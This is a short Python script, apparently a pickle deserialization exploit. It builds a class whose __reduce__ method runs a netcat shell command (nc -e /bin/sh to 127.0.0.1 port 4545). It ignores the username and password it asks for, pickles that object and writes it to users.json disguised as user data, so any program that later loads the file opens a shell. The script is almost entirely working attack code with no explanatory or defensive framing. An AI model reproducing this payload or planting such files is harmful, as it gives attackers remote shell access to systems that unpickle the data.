import os
import pickle
import base64

## Remote code execution
class RCE:
	    def __reduce__(self):
	    	cmd = ('/bin/sh -i 2>&1 | nc -e /bin/sh 127.0.0.1 4545 > /dev/null')
	    	return os.system, (cmd,)

def fun(name,password):
    s = {"username":name,"password":password}
    safecode = pickle.dumps(RCE())  #pass RCE object instead of username and password to save serialised instance of class
    with open("users.json","wb") as f:
        f.write(safecode)
    return safecode

if __name__ == '__main__':
    u = input("Username : ")
    p = input("Password : ")
    yo_fun = fun(u,p)
